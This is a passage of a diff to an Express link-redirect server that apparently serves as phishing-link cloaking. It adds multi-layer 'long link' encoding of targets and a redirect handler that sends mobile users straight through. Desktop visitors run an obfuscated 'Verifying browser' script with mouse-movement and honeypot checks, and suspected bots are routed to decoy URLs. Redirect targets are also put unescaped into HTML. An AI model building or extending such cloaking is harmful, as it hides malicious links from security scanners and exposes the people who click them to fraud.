+    let redirectTarget;
+    
+    if (decodeResult.success) {
+      redirectTarget = decodeResult.target;
+      logRequest('long-link-decode', req, res, { 
+        success: true,
+        layers: decodeResult.metadata.layers,
+        target: redirectTarget.substring(0, 50)
+      });
+    } else {
+      // Fall back to default target on decode failure
+      redirectTarget = TARGET_URL;
+      logRequest('long-link-decode', req, res, { 
+        success: false,
+        reason: decodeResult.reason
+      });
+    }
+
+    // Track the redirect
+    stats.successfulRedirects++;
+    
+    if (dbPool && analyticsQueue) {
+      analyticsQueue.add({
+        type: 'redirect',
+        data: {
+          path: 'r',
+          ip,
+          userAgent: req.headers['user-agent'],
+          deviceInfo,
+          country,
+          target: redirectTarget,
+          decodeSuccess: decodeResult.success,
+          linkMode: 'long'
+        }
+      });
+    }
+
+    // Device-specific handling
+    if (deviceInfo.isMobile) {
+      // Mobile gets instant redirect
+      return res.send(`<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <meta http-equiv="refresh" content="0;url=${redirectTarget}">
+  <style>body{background:#000;margin:0;padding:0}</style>
+</head>
+<body></body>
+</html>`);
+    }
+
+    // Desktop gets verification challenge (if enabled)
+    if (validatedConfig.DISABLE_DESKTOP_CHALLENGE) {
+      return res.send(`<meta http-equiv="refresh" content="0;url=${redirectTarget}">`);
+    }
+
+    // Human verification challenge
+    const hpSuffix = crypto.randomBytes(2).toString('hex');
+    const nonce = res.locals.nonce;
+
+    const challenge = `
+      (function(){
+        const T='${redirectTarget.replace(/'/g, "\\'")}';
+        const F='${BOT_URLS[0]}';
+        let m=0,e=0,lx=0,ly=0,lt=Date.now();
+        
+        document.addEventListener('mousemove',function(e){
+          if(lx&&ly){
+            const dt=(Date.now()-lt)/1000||1;
+            const distance = Math.hypot(e.clientX-lx, e.clientY-ly);
+            const speed = distance / dt;
+            e = Math.log2(1 + speed);
+            m++;
+          }
+          lx=e.clientX; ly=e.clientY; lt=Date.now();
+        },{passive:true});
+        
+        setTimeout(function(){
+          const sus = e<2.5 || m<2 || document.getElementById('hp_${hpSuffix}')?.value;
+          location.href = sus ? F : T;
+        },1200);
+      })();
+    `;
+
+    const obfuscated = JavaScriptObfuscator.obfuscate(challenge, {
+      compact: true,
+      controlFlowFlattening: true,
+      stringArray: true,
+      disableConsoleOutput: true,
+      selfDefending: true
+    }).getObfuscatedCode();
+
+    res.send(`<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <meta http-equiv="refresh" content="3;url=${BOT_URLS[0]}">
+  <style nonce="${nonce}">
+    *{margin:0;padding:0}
+    body{background:#0a0a0a;color:#fff;font-family:sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh}
+    .spinner{width:40px;height:40px;border:3px solid #2a2a2a;border-top-color:#8a8a8a;border-radius:50%;margin:20px auto;animation:spin 1s linear infinite}
+    @keyframes spin{to{transform:rotate(360deg)}}
+    .hidden{position:absolute;width:1px;height:1px;overflow:hidden}
+    .message{text-align:center}
+    .message p{margin-top:10px;color:#666}
+  </style>
+</head>
+<body>
+  <div class="message">
+    <div class="spinner"></div>
+    <p>Verifying browser...</p>
+    <div class="hidden"><input id="hp_${hpSuffix}"></div>
+  </div>
+  <script nonce="${nonce}">${obfuscated}</script>
+</body>
+</html>`);
+  } catch (err) {
+    next(err);
+  }
 });
 
 // Get All Links
@@ -1395,6 +2019,8 @@ async function getAllLinks() {
           max_clicks: data.maxClicks || null,
           password_protected: !!data.passwordHash,
           notes: data.notes || '',
+          link_mode: data.linkMode || 'short',
+          link_length: data.linkMetadata?.length || 0,
           status: data.expiresAt > Date.now() ? 'active' : 'expired'
         });
       }
@@ -1406,6 +2032,7 @@ async function getAllLinks() {
     const result = await dbPool.query(
       `SELECT id, target_url, created_at, expires_at, current_clicks, max_clicks, 
               (password_hash IS NOT NULL) as password_protected, COALESCE(metadata->>'notes', '') as notes,
+              link_mode, link_metadata->>'length' as link_length,
               CASE 
                 WHEN expires_at < NOW() THEN 'expired'
                 WHEN current_clicks >= max_clicks AND max_clicks IS NOT NULL THEN 'completed'
@@ -1427,7 +2054,7 @@ app.get('/api/stats/:id', async (req, res, next) => {
   try {
     const linkId = req.params.id;
     
-    if (!/^[a-f0-9]{32}$/i.test(linkId)) {
+    if (!/^[a-f0-9]{32,64}$/i.test(linkId)) {
       throw new AppError('Invalid link ID', 400);
     }
     
@@ -1442,6 +2069,8 @@ app.get('/api/stats/:id', async (req, res, next) => {
       maxClicks: linkData?.maxClicks || null,
       passwordProtected: !!linkData?.passwordHash,
       notes: linkData?.notes || '',
+      linkMode: linkData?.linkMode || 'short',
+      linkLength: linkData?.linkMetadata?.length || 0,
       uniqueVisitors: 0,
       countries: {},
       devices: {},
@@ -1470,7 +2099,7 @@ app.get('/api/stats/:id', async (req, res, next) => {
         );
         
         const recentResult = await dbPool.query(
-          `SELECT ip, country, device_type, created_at 
+          `SELECT ip, country, device_type, link_mode, created_at 
            FROM clicks 
            WHERE link_id = $1 
            ORDER BY created_at DESC 
@@ -1579,6 +2208,14 @@ app.get('/api/settings', async (req, res, next) => {
       redisEnabled: !!redisClient,
       queuesEnabled: !!redirectQueue,
       desktopChallenge: !validatedConfig.DISABLE_DESKTOP_CHALLENGE,
+      
+      // Link mode settings
+      linkLengthMode: LINK_LENGTH_MODE,
+      allowLinkModeSwitch: ALLOW_LINK_MODE_SWITCH,
+      longLinkSegments: LONG_LINK_SEGMENTS,
+      longLinkParams: LONG_LINK_PARAMS,
+      linkEncodingLayers: LINK_ENCODING_LAYERS,
+      
       botThresholds: {
         mobile: 20,
         desktop: 65
@@ -1618,10 +2255,172 @@ app.post('/api/settings', csrfProtection, async (req, res, next) => {
     if (key === 'botThresholds') {
       // Update bot thresholds dynamically
       logger.info('Bot thresholds updated:', value);
+    } else if (key === 'linkLengthMode') {
+      global.LINK_LENGTH_MODE = value;
+    } else if (key === 'allowLinkModeSwitch') {
+      global.ALLOW_LINK_MODE_SWITCH = value;
+    } else if (key === 'longLinkSegments') {
+      global.LONG_LINK_SEGMENTS = parseInt(value);
+    } else if (key === 'longLinkParams') {
+      global.LONG_LINK_PARAMS = parseInt(value);
+    } else if (key === 'linkEncodingLayers') {
+      global.LINK_ENCODING_LAYERS = parseInt(value);
     }
     
     io.emit('settings-updated', { key, value });
     res.json({ success: true });
+  } catch (err) {
+    next(err);
+  }
+});
+
+// Update link mode settings
+app.post('/api/settings/link-mode', csrfProtection, async (req, res, next) => {
+  try {
+    if (!req.session.authenticated) {
+      throw new AppError('Unauthorized', 401);
+    }
+    
+    const { 
+      linkLengthMode,
+      allowLinkModeSwitch,
+      longLinkSegments,
+      longLinkParams,
+      linkEncodingLayers 
+    } = req.body;
+    
+    // Validate inputs
+    if (linkLengthMode && !['short', 'long', 'auto'].includes(linkLengthMode)) {
+      throw new AppError('Invalid link mode', 400);
+    }
+    
+    if (longLinkSegments && (longLinkSegments < 3 || longLinkSegments > 20)) {
+      throw new AppError('Long link segments must be between 3 and 20', 400);
+    }
+    
+    if (longLinkParams && (longLinkParams < 5 || longLinkParams > 30)) {
+      throw new AppError('Long link params must be between 5 and 30', 400);
+    }
+    
+    if (linkEncodingLayers && (linkEncodingLayers < 2 || linkEncodingLayers > 8)) {
+      throw new AppError('Encoding layers must be between 2 and 8', 400);
+    }
+    
+    // Store in database
+    if (dbPool) {
+      const updates = [];
+      if (linkLengthMode) {
+        updates.push(dbPool.query(
+          'INSERT INTO settings (key, value, updated_by) VALUES ($1, $2, $3) ON CONFLICT (key) DO UPDATE SET value = $2, updated_at = CURRENT_TIMESTAMP, updated_by = $3',
+          ['linkLengthMode', JSON.stringify(linkLengthMode), req.session.user]
+        ));
+      }
+      
+      if (allowLinkModeSwitch !== undefined) {
+        updates.push(dbPool.query(
+          'INSERT INTO settings (key, value, updated_by) VALUES ($1, $2, $3) ON CONFLICT (key) DO UPDATE SET value = $2, updated_at = CURRENT_TIMESTAMP, updated_by = $3',
+          ['allowLinkModeSwitch', JSON.stringify(allowLinkModeSwitch), req.session.user]
+        ));
+      }
+      
+      if (longLinkSegments) {
+        updates.push(dbPool.query(
+          'INSERT INTO settings (key, value, updated_by) VALUES ($1, $2, $3) ON CONFLICT (key) DO UPDATE SET value = $2, updated_at = CURRENT_TIMESTAMP, updated_by = $3',
+          ['longLinkSegments', JSON.stringify(longLinkSegments), req.session.user]
+        ));
+      }
+      
+      if (longLinkParams) {
+        updates.push(dbPool.query(
+          'INSERT INTO settings (key, value, updated_by) VALUES ($1, $2, $3) ON CONFLICT (key) DO UPDATE SET value = $2, updated_at = CURRENT_TIMESTAMP, updated_by = $3',
+          ['longLinkParams', JSON.stringify(longLinkParams), req.session.user]
+        ));
+      }
+      
+      if (linkEncodingLayers) {
+        updates.push(dbPool.query(
+          'INSERT INTO settings (key, value, updated_by) VALUES ($1, $2, $3) ON CONFLICT (key) DO UPDATE SET value = $2, updated_at = CURRENT_TIMESTAMP, updated_by = $3',
+          ['linkEncodingLayers', JSON.stringify(linkEncodingLayers), req.session.user]
+        ));
+      }
+      
+      await Promise.all(updates);
+    }
+    
+    // Update in-memory variables
+    if (linkLengthMode) global.LINK_LENGTH_MODE = linkLengthMode;
+    if (allowLinkModeSwitch !== undefined) global.ALLOW_LINK_MODE_SWITCH = allowLinkModeSwitch;
+    if (longLinkSegments) global.LONG_LINK_SEGMENTS = longLinkSegments;
+    if (longLinkParams) global.LONG_LINK_PARAMS = longLinkParams;
+    if (linkEncodingLayers) global.LINK_ENCODING_LAYERS = linkEncodingLayers;
+    
+    io.emit('settings-updated', { 
+      type: 'link-mode',
+      settings: {
+        linkLengthMode,
+        allowLinkModeSwitch,
+        longLinkSegments,
+        longLinkParams,
+        linkEncodingLayers
+      }
+    });
+    
+    res.json({ 
+      success: true,
+      message: 'Link mode settings updated successfully'
+    });
+  } catch (err) {
+    next(err);
+  }
+});
+
+// Test endpoint to compare short vs long links
+app.get('/api/test/link-modes', async (req, res, next) => {
+  try {
+    if (!req.session.authenticated) {
+      throw new AppError('Unauthorized', 401);
+    }
+    
+    const testUrl = req.query.url || 'https://example.com/very/long/path/with/many/segments/that/might/need/encoding?param1=value1&param2=value2&param3=value3';
+    
+    // Generate short link
+    const shortResult = generateShortLink(testUrl, req);
+    
+    // Generate long link with various configurations
+    const longResults = [];
+    
+    for (const segments of [4, 6, 8]) {
+      for (const params of [8, 12, 16]) {
+        const result = await generateLongLink(testUrl, req, {
+          segments,
+          params,
+          minLayers: 4,
+          maxLayers: 6
+        });
+        longResults.push({
+          config: { segments, params },
+          url: result.url,
+          length: result.url.length,
+          metadata: result.metadata
+        });
+      }
+    }
+    
+    res.json({
+      originalUrl: testUrl,
+      originalLength: testUrl.length,
+      shortLink: {
+        url: shortResult.url,
+        length: shortResult.url.length,
+        ratio: (shortResult.url.length / testUrl.length).toFixed(2)
+      },
+      longLinks: longResults.sort((a, b) => a.length - b.length),
+      summary: {
+        shortest: Math.min(...longResults.map(r => r.length)),
+        longest: Math.max(...longResults.map(r => r.length)),
+        average: longResults.reduce((sum, r) => sum + r.length, 0) / longResults.length
+      }
+    });
   } catch (err) {
     next(err);
   }
@@ -1662,7 +2461,9 @@ app.post('/v/:id/verify', express.json(), async (req, res, next) => {
           currentClicks: row.current_clicks,
           expiresAt: new Date(row.expires_at).getTime(),
           created: new Date(row.created_at).getTime(),
-          notes: row.notes
+          notes: row.notes,
+          linkMode: row.link_mode,
+          linkMetadata: row.link_metadata
         };
         // Add to cache
         const ttl = Math.max(60, Math.floor((linkData.expiresAt - Date.now()) / 1000));
@@ -1709,7 +2510,7 @@ app.get('/v/:id', strictLimiter, async (req, res, next) => {
     const showQr = req.query.qr === 'true';
     const embed = req.query.embed === 'true';
     
-    if (!/^[a-f0-9]{32}$/i.test(linkId)) {
+    if (!/^[a-f0-9]{32,64}$/i.test(linkId)) {
       return res.redirect(BOT_URLS[Math.floor(Math.random() * BOT_URLS.length)]);
     }
     
@@ -1749,7 +2550,9 @@ app.get('/v/:id', strictLimiter, async (req, res, next) => {
           currentClicks: row.current_clicks,
           expiresAt: new Date(row.expires_at).getTime(),
           created: new Date(row.created_at).getTime(),
-          notes: row.notes
+          notes: row.notes,
+          linkMode: row.link_mode,
+          linkMetadata: row.link_metadata
         };
         // Add to cache
         const ttl = Math.max(60, Math.floor((data.expiresAt - Date.now()) / 1000));
@@ -1789,7 +2592,11 @@ app.get('/v/:id', strictLimiter, async (req, res, next) => {
     data.lastAccessed = Date.now();
     linkCache.set(linkId, data);
 
-    logRequest('redirect-attempt', req, res, { target: data.target.substring(0, 50), hasPassword: !!data.passwordHash });
+    logRequest('redirect-attempt', req, res, { 
+      target: data.target.substring(0, 50), 
+      hasPassword: !!data.passwordHash,
+      linkMode: data.linkMode || 'short'
+    });
 
     if (dbPool && redirectQueue) {
       redirectQueue.add({
@@ -1797,7 +2604,8 @@ app.get('/v/:id', strictLimiter, async (req, res, next) => {
         ip,
         userAgent: req.headers['user-agent'],
         deviceInfo,
-        country
+        country,
+        linkMode: data.linkMode || 'short'
       });
     }
 
@@ -2748,7 +3556,12 @@ app.get('/admin', async (req, res, next) => {
       '{{dbPoolStatus}}': dbPool ? 'connected' : 'disconnected',
       '{{redisStatus}}': redisClient?.status === 'ready' ? 'connected' : 'disconnected',
       '{{redirectQueueStatus}}': redirectQueue ? 'connected' : 'disconnected',
-      '{{bullBoardPath}}': validatedConfig.BULL_BOARD_PATH
+      '{{bullBoardPath}}': validatedConfig.BULL_BOARD_PATH,
+      '{{linkLengthMode}}': LINK_LENGTH_MODE,
+      '{{allowLinkModeSwitch}}': ALLOW_LINK_MODE_SWITCH,
+      '{{longLinkSegments}}': LONG_LINK_SEGMENTS,
+      '{{longLinkParams}}': LONG_LINK_PARAMS,
+      '{{linkEncodingLayers}}': LINK_ENCODING_LAYERS
     };
     
     for (const [key, value] of Object.entries(replacements)) {
@@ -2797,6 +3610,7 @@ app.post('/admin/clear-cache', csrfProtection, (req, res) => {
   geoCache.flushAll();
   deviceCache.flushAll();
   qrCache.flushAll();
+  encodingConfigCache.flushAll();
   
   logger.info('Cache cleared by admin');
   res.json({ success: true });
@@ -2832,7 +3646,7 @@ app.get('/api/export/:id', async (req, res, next) => {
     }
     
     const result = await dbPool.query(
-      `SELECT id, link_id, ip, country, device_type, created_at 
+      `SELECT id, link_id, ip, country, device_type, link_mode, created_at 
        FROM clicks 
        WHERE link_id = $1 
        ORDER BY created_at DESC`,
@@ -2840,7 +3654,7 @@ app.get('/api/export/:id', async (req, res, next) => {
     );
     
     if (format === 'csv') {
-      const headers = ['id', 'link_id', 'ip', 'country', 'device_type', 'created_at'];
+      const headers = ['id', 'link_id', 'ip', 'country', 'device_type', 'link_mode', 'created_at'];
       const csv = [
         headers.join(','),
         ...result.rows.map(row => 
@@ -2985,6 +3799,8 @@ ensurePublicDirectory().then(() => {
     console.log(`  📊 Max Links: ${MAX_LINKS.toLocaleString()}`);
     console.log(`  📱 Mobile threshold: 20`);
     console.log(`  💻 Desktop threshold: 65`);
+    console.log(`  🔗 Link Mode: ${LINK_LENGTH_MODE} (${ALLOW_LINK_MODE_SWITCH ? 'switchable' : 'fixed'})`);
+    console.log(`  📏 Long Link Segments: ${LONG_LINK_SEGMENTS} | Params: ${LONG_LINK_PARAMS} | Layers: ${LINK_ENCODING_LAYERS}`);
     console.log(`  🗄️  Session Store: ${sessionStore.constructor.name}`);
     console.log(`  📍 Admin UI: http://localhost:${PORT}/admin`);
     console.log(`  🔐 Default admin: ${ADMIN_USERNAME} / [protected]`);
@@ -3000,7 +3816,8 @@ ensurePublicDirectory().then(() => {
     logger.info('Server started', {
       port: PORT,
       nodeEnv: NODE_ENV,
-      version: '3.0.0'
+      version: '3.0.0',
+      linkMode: LINK_LENGTH_MODE
     });
     
     fs.appendFile(REQUEST_LOG_FILE, JSON.stringify({
@@ -3008,7 +3825,8 @@ ensurePublicDirectory().then(() => {
       type: 'startup',
       version: '3.0.0-enterprise',
       port: PORT,
-      nodeEnv: NODE_ENV
+      nodeEnv: NODE_ENV,
+      linkMode: LINK_LENGTH_MODE
     }) + '\n').catch(() => {});
   });
 });
